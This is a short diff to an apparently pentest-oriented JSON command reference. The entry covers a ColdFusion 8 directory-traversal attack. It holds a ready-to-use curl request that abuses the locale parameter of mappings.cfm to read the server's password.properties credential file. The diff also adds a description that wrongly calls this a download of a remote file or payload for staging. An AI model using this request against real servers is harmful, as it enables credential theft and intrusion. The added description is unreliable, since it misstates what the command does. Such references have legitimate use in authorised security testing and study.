@@ -34,7 +34,8 @@
   "variations": [
     {
       "label": "Manual traversal via the vulnerable locale parameter (no script)",
-      "command": "curl \"http://<ip>:<port>/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties\""
+      "command": "curl \"http://<ip>:<port>/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties\"",
+      "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
     }
   ],
   "examples": [
